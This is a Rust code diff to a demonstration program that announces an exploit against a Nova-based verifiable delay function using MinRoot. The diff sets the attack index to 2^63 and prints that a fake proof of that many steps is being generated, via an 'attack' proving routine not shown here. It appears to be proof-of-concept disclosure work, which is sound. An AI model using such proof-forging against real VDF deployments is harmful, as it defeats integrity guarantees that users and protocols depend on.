@@ -141,15 +141,16 @@ where
   }
 }
 
+//
 fn main() {
   println!("========================================================================");
   println!("Demonstrating exploit against Nova-based VDF with MinRoot delay function");
   println!("========================================================================");
 
+  // Attack Index = i = 2^63
+  let i = 9223372036854775808;
   // number of iterations of MinRoot per Nova's recursive step
-  let i = 1000000000;
   let num_iters_per_step = 4096;
-  println!("Faking {num_iters_per_step} iterations of MinRoot per step");
 
   let circuit_primary = MinRootCircuit {
     seq: vec![
@@ -200,7 +201,7 @@ fn main() {
   let zi_minus_one_primary = vec![<G1 as Group>::Scalar::zero();circuit_primary.arity()];
   let zi_minus_one_secondary = vec![<G2 as Group>::Scalar::zero();circuit_secondary.arity()];
 
-  println!("Generating fake proof of {i} executions...");
+  println!("Generating fake proof of {} IVC Steps == {} iterations of Minroot...", i, (i as u128) * (num_iters_per_step as u128));
   let start = Instant::now();
   let recursive_snark = RecursiveSNARK::<G1, G2, C1, C2>::attack(
     &pp,
